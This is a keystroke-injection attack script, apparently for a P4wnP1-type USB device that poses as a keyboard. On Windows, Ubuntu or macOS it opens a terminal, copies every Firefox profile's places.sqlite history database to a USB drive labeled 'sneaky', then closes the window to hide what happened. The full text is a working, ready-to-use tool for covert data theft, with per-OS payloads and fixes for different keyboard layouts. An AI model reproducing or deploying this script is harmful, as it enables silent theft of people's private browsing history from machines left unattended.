typingSpeed(10,0)

// will be changed via sed
var lang = 'us'
var os = 'Windows'

// set keyboard language
layout(lang)

// helpers
function runPowershell() {
    press("GUI r") // windows + r
    delay(500)
    type("powershell\n") // write powershell and press "enter"
    delay(1000)
}

function ubuntuTerminal() {
    press("GUI")
    // window effects delay
    // especially if running in VM
    delay(5000)
    type("ter\n")
    // use less delay later
  	delay(5000)
}

function macTerminal() {
  press("GUI SPACE")
  // window effects delay
  // especially if running in VM
  delay(5000)
  type("termi\n")
  // use less delay later
  delay(5000)
}

function winPayload() {
    // get drive name of mass storage, improved version: only the value!
    type("$usbPath = Get-WMIObject Win32_Volume | ? { $_.Label -eq 'sneaky' } | select -expand name\n")
  	// use double \ --> \\ (otherwise if gets escaped)
    type("$counter = 0 ; Get-ChildItem -Path .\\AppData\\Roaming\\Mozilla\\Firefox\\Profiles\\ | Foreach-Object { cp (Join-Path $_.FullName 'places.sqlite') $usbPath'places'$counter'.sqlite' ; $counter++ } ; if ($?) { [IO.File]::WriteAllLines((Join-Path $usbPath 'places.txt'), 'done') ; Write-VolumeCache $usbPath[0] ; exit }\n")
}

function ubuntuPayload() {
    // path: /media/$(users)/sneaky
    type("counter=0 && for dir in ~/.mozilla/firefox/*/ ; do if [[ $dir != *'Crash'* && $dir != *'Pending'* ]]; then cp -r $dir/places.sqlite /media/$(users)/sneaky/places$counter.sqlite 2>/dev/null ; ((counter=counter+1)); fi ; done && echo 'done' > /media/$(users)/sneaky/places.txt && sync && exit\n")
}

function macPayload() {
  // drive path: /Volumes/sneaky
  // profiles path: /Users/$(users)/Library/Application Support/Firefox/Profiles
  
  if (lang === "de") {
    // ALT 7 --> |
    //press("ALT 7")
    type("counter=0 && for dir in \"/Users/$(users)/Library/Application Support/Firefox/Profiles/\"* ; do cp -r $dir/places.sqlite /Volumes/sneaky/places$counter.sqlite 2°/dev/null ; ((counter=counter+1)) ; done && echo 'done' ° /Volumes/sneaky/places.txt && sync && pkill -a Terminal\n")
  } else if (lang === "us") {
    type("counter=0 && for dir in \"/Users/$(users)/Library/Application Support/Firefox/Profiles/\"* ; do cp -r $dir/places.sqlite /Volumes/sneaky/places$counter.sqlite 2>/dev/null ; ((counter=counter+1)) ; done && echo 'done' > /Volumes/sneaky/places.txt && sync && pkill -a Terminal\n")
  } else {
    // french
    //type("°!\§$%&/()=?`QWERTZUIOPÜ*ASDFGHJKLÖÄ'>YXCVBNM;:_^°\n\n")
    
    // ! --> =
    // § --> +
    // = --> -
    
    type("counter!0 && for dir in \"/Users/$(users)/Library/Application Support/Firefox/Profiles/\"")
    
    // *
    layout("us")
    press("SHIFT Ü");
	type("}");
    layout(lang)
    
    type(" ; do cp =r $dir/places.sqlite /Volumes/sneaky/places$counter.sqlite 2")

    // workaround to fix the broken french layout
    // >
    layout("us")
    press("SHIFT Ü");
    type("~");
    layout(lang)
    
    type("/dev/null ; ((counter!counter§1)) ; done && echo 'done' ")
    
    // workaround to fix the broken french layout
    // >
    layout("us")
    press("SHIFT Ü");
    type("~");
    layout(lang)
         
    type(" /Volumes/sneaky/places.txt && sync && pkill =a Terminal\n")

  }

}


if (os === "Windows") {
  runPowershell()
  winPayload()
}

else if (os === "Ubuntu") {
  ubuntuTerminal() 
  ubuntuPayload()
}

else if (os === "Mac") {
  macTerminal()
  macPayload()
}
